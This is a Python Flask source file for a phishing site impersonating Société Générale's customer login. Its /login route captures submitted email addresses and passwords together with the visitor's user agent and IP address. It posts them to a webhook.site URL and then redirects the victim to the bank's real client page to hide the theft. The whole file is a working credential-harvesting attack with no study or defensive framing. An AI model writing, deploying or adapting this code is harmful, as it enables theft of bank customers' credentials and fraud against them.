from flask import Flask, request, redirect
import requests

app = Flask(__name__)


WEBHOOK_URL = "https://webhook.site/8324395e-7a3b-4289-a800-e9759cf53b78"


REAL_SG_URL = "https://www.societegenerale.com/fr/particulier/espace-client"


with open('index.html', 'r', encoding='utf-8') as f:
    html_content = f.read()

@app.route('/')
def home():
    return html_content

@app.route('/login', methods=['POST'])
def login():
    
    email = request.form.get('email')
    password = request.form.get('password')
    user_agent = request.headers.get('User-Agent')
    ip_address = request.remote_addr

    
    data_to_send = {
        "Date": "2026-08-03",
        "Email": email,
        "Mot de passe": password,
        "Appareil": user_agent,
        "Adresse IP": ip_address
    }

    
    try:
        requests.post(WEBHOOK_URL, json=data_to_send, timeout=5)
        print(f"[+] Données reçues : {email} / {password}")
    except Exception as e:
        print(f"[-] Erreur d'envoi : {e}")

    
    return redirect(REAL_SG_URL)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
